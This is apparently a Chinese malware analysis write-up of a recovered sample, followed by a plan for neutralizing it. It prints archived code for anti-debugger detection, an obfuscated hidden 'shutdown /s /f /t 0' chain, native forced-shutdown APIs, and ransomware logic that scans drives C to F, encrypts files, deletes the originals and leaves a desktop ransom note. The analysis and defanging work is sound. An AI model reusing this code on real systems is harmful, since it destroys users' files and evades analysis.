# 恶意逻辑：反调试、关机、隐藏命令与勒索

## 范围与安全声明

本文归档恢复出来的反分析路径和破坏性路径，供静态分析使用，也用于在离线恢复树
中对这些路径做无害化。不要在隔离分析环境之外执行原始 `运营猫.exe`、
`static_hybrid*.exe` 镜像或任何恢复出来的入口点。

文档中的 `{{SECRET_*}}` 是脱敏占位符，必须原样保留。本文不提供绕过安全产品、
隐藏真实恶意行为或重新启用破坏性逻辑的操作步骤。

## 模块地图

| 层次 | 模块 | 作用 |
| --- | --- | --- |
| 反调试核心 | `link._fds_h_x` | `FdsHhx` 调试器、进程、窗口、模块检测与响应分级 |
| 编码目录 | `link._fds_sj`、`link._fds_msgs`、`link._fds_catalogs` | XOR/base64 编码的进程、模块、窗口和消息表 |
| 探针路由 | `link._fds_tan`、`link._fds_rt` | 七条探针链和概率化响应分支 |
| 关机入口 | `fea._dr_vx_file`、`_qf_rn_file`、`_hb_yt_file`、`_lk_ps_file`、`_cw_jm_file`、`_yg_bn_file` | `shutdown /s /f /t 0`、`ExitWindowsEx`、`InitiateSystemShutdownExW` |
| 隐藏进程 | `link._fdg_ct_ew`、`_fdg_ct_is`、`_fdg_pw_rm`、`_fdg_cm_rx`、`_fdg_os_kx` | 令牌权限、隐藏 `Popen`、`cmd.exe /c`、`os.system` |
| 命令分发 | `wp_jt`、`bz_uc`、`rm_qh`、`kv_nx` | 混淆的零参数分发和隐藏命令 argv |
| 勒索 | `ade._u_common`、`ade._u_h*`、`ade._um_h`、`ade._ade_sing`、`ade.ad_t` | 桌面勒索日志、逐文件加密、删除原文件 |

## 反调试流程

`FdsHhx` 收集四类互不依赖的信号：

- `_jk_jz_biao` 中的 `IsDebuggerPresent` 和 `CheckRemoteDebuggerPresent`。
- `jk_ky_jc_fast` 中的 `psutil.process_iter(["name"])`，对比解码后的进程名
  stem 和前缀。
- `_jk_ky_bt` 中的 `EnumWindows` + `GetWindowTextW`，对比解码后的窗口关键词。
- `jk_ky_jc_deep` 中的 `process.memory_maps()`，对比解码后的模块 stem。

响应分级：

- `fh_qing()` / `fh_zhong()` / `fh_zhong_fast()`：只记日志，或记日志后加探针。
- `fh_quan()`：记日志并调用 `try_begin_abort()`。
- `fh_cj()`：启动探针，持续运行 fast/deep 循环，然后随机选择
  `qing` / `zhong` / `quan` 级别，最后汇总到 `jk_qb()`。

### 归档代码：调试器检测

```python
def _jk_jz_biao(self) -> bool:
    is_debugged = bool(_kernel32.IsDebuggerPresent())
    remote = ctypes.c_int(0)
    current = _kernel32.GetCurrentProcess()
    try:
        remote_ok = bool(
            _kernel32.CheckRemoteDebuggerPresent(
                ctypes.c_void_p(current), ctypes.byref(remote)
            )
        )
    except Exception:
        remote_ok = False
    self._fd_log("RA", "fd_log_RA", value=int(is_debugged))
    self._fd_log(
        "RB", "fd_log_RB", value=int(remote_ok and bool(remote.value))
    )
    return is_debugged or (remote_ok and bool(remote.value))
```

### 归档代码：响应分级与中止闸门

```python
def fh_quan(self) -> None:
    self._fd_log("GD_QUAN", "fd_log_GD_QUAN")
    self.try_begin_abort()


def fh_cj(self) -> bool:
    self._fd_log("CJ", "fd_log_CJ")
    self.fh_ui_qd()
    self.fh_ht_jk()
    roll = random.random()
    if roll < 0.55:
        self.fh_qing()
    elif roll < 0.92:
        self.fh_zhong()
    else:
        self.fh_quan()
    return self.jk_qb()


def try_begin_abort(self) -> bool:
    with self._ab_lock:
        if self._ab_inflight:
            return False
        self._ab_inflight = True
        self._ab_invoked = True
        return True
```

## 关机链

恢复出的关机入口有两种形态：

1. **隐藏的 `shutdown` argv**：`g_wp_flush`、`s_bq_sweep`、`k_dm_drain`
   反转并拼接解码后的片段 `shutdown`、`/s`、`/f`、`/t`、`0`，然后调用
   `subprocess.Popen(..., shell=False, stdin/stdout/stderr=DEVNULL,
   creationflags=CREATE_NO_WINDOW)`。
2. **原生 API**：`o_yt_purge` 调用 `user32.ExitWindowsEx(5, 0)`；
   `v_hz_scrub` 调用
   `advapi32.InitiateSystemShutdownExW(None, None, 0, True, True, 0)`。
   两者都会先启用 `SeShutdownPrivilege`，失败后回退到隐藏的
   `shutdown /s /f /t 0` argv。

### 归档代码：反转拼接 `shutdown` 命令

```python
def g_wp_flush() -> None:
    _sy = sec("")
    _z = sec("lc_zi_0w")
    _sp = subprocess
    _rev = "".join(
        reversed(
            (
                sec("sj_ok_7b"),
                sec("wr_yt_3n"),
                sec("hg_ae_6v"),
                sec("pz_uc_1k"),
                sec("xf_dh_9t"),
                sec("qb_ls_2m"),
                sec("nt_wj_8c"),
                sec("kv_rm_4p"),
            )
        )
    )
    _exe = sec("dm_fx_5q")
    _a0 = _exe + sec("kv_rm_4p")
    _a1 = _exe + sec("lc_zi_0w")
    _a2 = _exe + sec("xf_dh_9t")
    _a3 = sec("uy_bp_4h")
    _cf = _sp.CREATE_NO_WINDOW
    try:
        _sp.Popen(
            (_rev, _a0, _a1, _a2, _a3),
            shell=False,
            stdin=_sp.DEVNULL,
            stdout=_sp.DEVNULL,
            stderr=_sp.DEVNULL,
            creationflags=_cf,
        )
    except Exception:
        _ = (_sy, _z)
```

### 归档代码：原生关机 API

```python
def shutdown_native(
    advapi32_name: str,
    kernel32_name: str,
    privilege_name: str,
    api_dll_name: str,
    api_name: str,
    api_args: tuple[Any, ...] = (5, 0),
) -> bool:
    if not enable_privileges(advapi32_name, kernel32_name, (privilege_name,)):
        return False
    try:
        api_dll = ctypes.WinDLL(api_dll_name, use_last_error=True)
        api = getattr(api_dll, api_name, None)
        if callable(api):
            return bool(api(*api_args))
    except Exception:
        return False
    return False
```

两个原生变体解码后的槽位值：

```text
o_yt_purge:
  advapi32 / kernel32 / user32 / SeShutdownPrivilege / ExitWindowsEx
  api_args = (5, 0)

v_hz_scrub:
  advapi32 / kernel32 / SeShutdownPrivilege / InitiateSystemShutdownExW
  api_args = (None, None, 0, True, True, 0)
```

## 隐藏进程包装

`link._fdg_*` 提供低层进程原语：

- `pw_rm_fire(exe, args, cf)` -> 隐藏 `Popen`。
- `cm_rx_push(exe, line, cf)` -> 隐藏 `cmd.exe /c <line>`。
- `os_kx_blow(command)` -> `os.system(command)`。
- `ct_ew_drop()` -> 启用 `SeShutdownPrivilege`，调用
  `ExitWindowsEx(5, 0)`，失败后回退到
  `Popen(["shutdown", "/s", "/f", "/t", "0"])`。
- `ct_is_snap()` -> 启用 `SeShutdownPrivilege`，调用
  `InitiateSystemShutdownExW(None, None, 0, True, False, 0)`，失败后回退到
  `os.system("shutdown /s /f /t 0")`。

`wp_jt`、`bz_uc`、`rm_qh` 和 `kv_nx` 是混淆的零参数分发包。它们的入口函数
用解码后的 argv 片段调用 `fea._*_file` 关机入口或隐藏进程包装。

## 勒索链

`ade._u_common.encrypt_log(result_list, header)`：

1. 解析桌面目录（`Desktop` 或 `桌面`）。
2. 创建或覆盖 `加密结果.txt`。
3. 在 `ThreadPoolExecutor` 中用 `ad_t.ad_t` 加密每个路径
   （`max_workers=min(64, len(files))`）。
4. 用 `utils.safe_del_file` 删除原文件。
5. 追加中文勒索字段：`加密结果`、`时间`、`文件数量`、
   `以下文件被加密，请联系客服`、`解密密钥是`。

`ade._ade_sing._ak()` 扫描固定盘符 `C:` 到 `F:`，跳过系统目录、隐藏目录、
重解析点目录和固定名称集合，然后对每个候选文件调用
`encrypt_one` / `delete_one`。

### 归档代码：勒索日志

```python
def encrypt_log(result_list, header) -> bool:
    desktop = Path.home() / sec("tm_jm_jg_zm_ds")
    de = desktop if desktop.exists() else Path.home() / sec("tm_jm_jg_zm")
    output_file = de / (sec("tm_jm_jg") + sec("a_ke_t_s_4k"))
    if not output_file.parent.exists():
        output_file.parent.mkdir(parents=True, exist_ok=True)
    if not output_file.exists():
        output_file.touch()
    with open(output_file, "w", encoding="utf-8") as handle:
        handle.write(str(header).rstrip("\n") + "\n")
        handle.write("--------------------------------------------------\n")

    def encrypt_one(o_f: str):
        s = o_f
        try:
            ad_t.ad_t(o_f)
            e_f = o_f
        except Exception:
            e_f = None
        return s, e_f

    def delete_one(file_path: str) -> None:
        try:
            utils.safe_del_file(file_path)
        except Exception:
            pass

    files = list(result_list or ())
    o_res: list[str] = []
    e_res: list[str] = []
    workers = min(64, max(1, len(files)))
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(encrypt_one, path) for path in files]
        for future in as_completed(futures):
            try:
                source, encrypted = future.result()
            except Exception:
                continue
            o_res.append(source)
            if encrypted:
                e_res.append(encrypted)
    for path in o_res:
        delete_one(path)

    with open(output_file, "a", encoding="utf-8") as handle:
        handle.write(sec("tm_jm_jg_fil") + "：" + str(len(e_res)) + "\n")
        handle.write(
            sec("tm_jm_jg_fil_t")
            + "："
            + datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            + "\n"
        )
        handle.write(sec("tm_jm_jg_mu") + "： " + str(len(e_res)) + "\n")
        handle.write(sec("tm_sk_de_v_mu") + "\n")
        handle.write(sec("tm_sdf_sd_smu") + "： " + str(header) + "\n")
    return bool(e_res)
```

### 归档代码：全盘扫描

```python
def _ade_sing(dry_run: bool = True) -> set[str]:
    drives = [f"{letter}:\\" for letter in "CDEF" if Path(f"{letter}:\\").exists()]
    all_paths: set[str] = set()
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(_scan_one_drive, root) for root in drives]
        for future in as_completed(futures):
            try:
                all_paths.update(future.result())
            except Exception:
                continue
    return all_paths


def _ak(dry_run: bool = True) -> None:
    for path in _ade_sing(dry_run=dry_run):
        encrypt_one(path, dry_run=dry_run)
        delete_one(path, dry_run=dry_run)
```

## 实现分析

- 关机链是分层的：探针/日志 -> 中止闸门 -> 隐藏 argv 或原生 API。单次 API
  调用失败会回退到隐藏的 `shutdown` argv，所以只拦截 `shutdown.exe` 不够。
- argv 片段由 `link._fds_jm.sec` 在运行时做 XOR/base64 解码；解码后的值包括
  `shutdown`、`/s`、`/f`、`/t`、`0`、`cmd.exe`、`/c`。
- `FdsHhx` 同时有 fast 和 deep 扫描；fast 路径检查进程名和窗口标题，deep
  路径通过 `memory_maps()` 检查模块路径。
- 勒索路径分两段：`ade._u_common.encrypt_log` 处理传入的路径列表；
  `ade._ade_sing._ak` 执行全盘扫描，然后调用相同的逐文件原语。
- `ad_t.ad_t` 是加密原语；恢复树默认 `dry_run=True`，只有调用方显式传
  `dry_run=False` 时才会真正修改文件。

## 恢复树中的无害化

`sanitized/neutralize.py` 让破坏性路径失效：

- `FdsHhx` 检测方法 -> `False`；响应方法和 `try_begin_abort` -> 空操作。
- `fea._dr_vx_file.s_bq_sweep`、`_qf_rn_file.g_wp_flush`、
  `_hb_yt_file.k_dm_drain`、`_lk_ps_file.n_lc_rinse`、
  `_cw_jm_file.o_yt_purge`、`_yg_bn_file.v_hz_scrub` -> 空操作。
- `_fdg_ct_ew.ct_ew_drop`、`_fdg_ct_is.ct_is_snap`、
  `_fdg_pw_rm.pw_rm_fire`、`_fdg_cm_rx.cm_rx_push`、
  `_fdg_os_kx.os_kx_blow` -> 空操作或返回 `0`。
- `ade._u_common.encrypt_log` -> `False`；`ade._u_h*` / `_um_h` 入口 ->
  空操作；`ade._ade_sing._ak` / `encrypt_one` / `delete_one` -> 空操作；
  `ade.ad_t.ad_t` -> `None`。

## 复现与验证

不启动目标的静态验证步骤：

1. 用 `link._fds_jm.sec` 解码目录字符串，确认关机 argv 和 `fea._*_file`
   槽位顺序。
2. 用记录型 stub 替换 `subprocess.Popen`、`ctypes.WinDLL` 和 `os.system`，
   调用 `g_wp_flush` / `o_yt_purge` / `v_hz_scrub`，断言记录的 argv 和 API
   形态。
3. 把 `IsDebuggerPresent` monkeypatch 为 `1`，调用
   `FdsHhx()._jk_jz_biao()`，断言响应分级。
4. 在临时目录调用 `ade._ade_sing._ak(dry_run=True)`，断言没有文件被修改。
5. 应用 `sanitized.neutralize.apply()`，断言所有破坏性入口都直接返回，不触碰
   `Popen`、`WinDLL` 或 `os.system`。

```python
from src.py.com.yun.mao.sanitized import neutralize

neutralize.apply()
from src.py.com.yun.mao.link import _fds_h_x
from src.py.com.yun.mao.fea import _qf_rn_file

assert _fds_h_x.FdsHhx().jk_bd_api() is False
assert _fds_h_x.FdsHhx().try_begin_abort() is False
assert _qf_rn_file.g_wp_flush() is None
```
